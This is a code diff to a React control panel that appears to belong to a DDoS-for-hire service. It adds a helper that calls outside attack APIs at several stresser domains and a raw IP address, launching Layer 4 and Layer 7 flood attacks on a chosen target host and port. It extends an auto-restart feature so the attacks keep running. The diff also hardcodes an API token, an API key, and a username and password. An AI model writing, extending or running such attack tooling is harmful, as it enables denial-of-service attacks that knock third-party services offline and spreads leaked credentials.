@@ -61,6 +61,26 @@ export default function Panel() {
     homeholdRef.current = homehold;
   }, [homehold]);
 
+  // Helper: fire the correct API for a task restart (L4 or L7)
+  const fireRestartApi = React.useCallback((task) => {
+    if (task.layer === 'L7') {
+      const token = "8xU8xJvvT6nF16JOF5XNT8";
+      const req = task.reqMethod || 'GET';
+      const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
+      fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold L7 restart failed", err));
+    } else if (task.layer === 'L4') {
+      let apiUrl = '';
+      if (task.method === 'UDP-BOTNET') {
+        apiUrl = `http://91.92.42.92/api/attack?username=satanswrath&password=satanswrath123456&host=${task.target}&time=${task.time}&port=${task.port || '80'}&method=udpbig`;
+      } else {
+        const apiKey = "639c040c5f5a16ffe9b56de90f3831cf5df5364524bc5610003efc864493b5b5";
+        const apiMethod = task.method === 'BGMI-V2' ? 'UDP-BIG' : task.method;
+        apiUrl = `https://retrostress.net/api/start?key=${apiKey}&target=${task.target}&port=${task.port || '80'}&time=${task.time}&method=${apiMethod}&concurrent=${task.conns}`;
+      }
+      fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold L4 restart failed", err));
+    }
+  }, []);
+
   // Helper to re-sync tasks based on wall-clock time (fixes background tab throttling)
   const syncTasksWithTime = React.useCallback((prevTasks) => {
     const now = Date.now();
@@ -70,12 +90,9 @@ export default function Panel() {
       const elapsed = Math.floor((now - task.startTimestamp) / 1000);
       const remaining = task.time - elapsed;
 
-      if (remaining <= 0 && task.layer === 'L7' && homeholdRef.current) {
+      if (remaining <= 0 && homeholdRef.current) {
         // Expired while in background — trigger homehold restart
-        const token = "8xU8xJvvT6nF16JOF5XNT8";
-        const req = task.reqMethod || 'GET';
-        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
-        fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold restart hit failed", err));
+        fireRestartApi(task);
         const d = new Date();
         return {
           ...task,
@@ -90,7 +107,7 @@ export default function Panel() {
     }).filter(Boolean);
 
     return updated;
-  }, []);
+  }, [fireRestartApi]);
 
   // Interval-based timer using wall-clock for accurate countdown
   useEffect(() => {
@@ -104,12 +121,9 @@ export default function Panel() {
             const elapsed = Math.floor((now - task.startTimestamp) / 1000);
             const remaining = task.time - elapsed;
 
-            if (remaining <= 1 && task.layer === 'L7' && homeholdRef.current) {
+            if (remaining <= 1 && homeholdRef.current) {
               // About to expire with homehold ON — restart
-              const token = "8xU8xJvvT6nF16JOF5XNT8";
-              const req = task.reqMethod || 'GET';
-              const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
-              fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold restart hit failed", err));
+              fireRestartApi(task);
               const d = new Date();
               return {
                 ...task,
@@ -448,8 +462,7 @@ export default function Panel() {
               </div>
             </div>
 
-            {layer === 'L7' && (
-              <div style={{
+            <div style={{
                 background: '#030303',
                 border: '1px solid var(--border-color)',
                 borderRadius: '8px',
@@ -461,7 +474,7 @@ export default function Panel() {
               }}>
                 <div>
                   <div style={{ fontWeight: 700, fontSize: '0.8rem', color: '#fff', textTransform: 'uppercase', marginBottom: '2px', letterSpacing: '0.05em' }}>Homehold</div>
-                  <div style={{ fontSize: '0.7rem', color: 'var(--text-secondary)' }}>Auto-restart running L7 job when timer ends</div>
+                  <div style={{ fontSize: '0.7rem', color: 'var(--text-secondary)' }}>Auto-restart running {layer} job when timer ends</div>
                 </div>
                 <div 
                   onClick={() => hasPlan && setHomehold(!homehold)}
@@ -489,7 +502,6 @@ export default function Panel() {
                   }}></div>
                 </div>
               </div>
-            )}
 
             {/* Duration Input */}
             <div>
